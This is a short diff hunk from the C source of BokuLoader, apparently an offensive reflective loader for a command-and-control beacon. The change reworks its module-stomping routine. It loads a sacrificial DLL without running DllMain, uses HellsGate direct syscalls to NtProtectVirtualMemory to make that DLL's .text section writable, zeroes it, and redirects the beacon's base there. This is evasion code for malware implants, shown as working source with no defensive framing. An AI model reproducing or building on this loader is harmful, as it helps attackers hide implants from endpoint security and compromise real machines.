@@ -25,15 +25,19 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         //    DLL to stomp UTF8 string,
         //    hFile = 0 ;This parameter is reserved for future use. It must be NULL.
         //    DONT_RESOLVE_DLL_REFERENCES  (0x00000001) ; the system does not call DllMain
-        rdll_dst.dllBase = api.LoadLibraryExA(((char*)rdll_src.dllBase+0x44),0,1);
-        if(rdll_dst.dllBase){
+        base = api.LoadLibraryExA(((char*)rdll_src.dllBase+0x44),0,1);
+        //rdll_dst.dllBase = ((char*)base + 0x3000);
+        base = ((char*)base + 0x3000);
+        oldprotect = 0;
+        if(base){
+            size = rdll_src.size + 0x2000;
             // Change memory protections of loaded beacon .text section to RW
             oldprotect = 0;
-            base = ((char*)rdll_dst.dllBase +0x3000);
-            size = rdll_src.size;
             // NtProtectVirtualMemory syscall
             HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
             ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, PAGE_READWRITE, &oldprotect);
+            RtlSecureZeroMemory(base,size);
+            rdll_dst.dllBase = base;
         }
     }
     else if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x3){
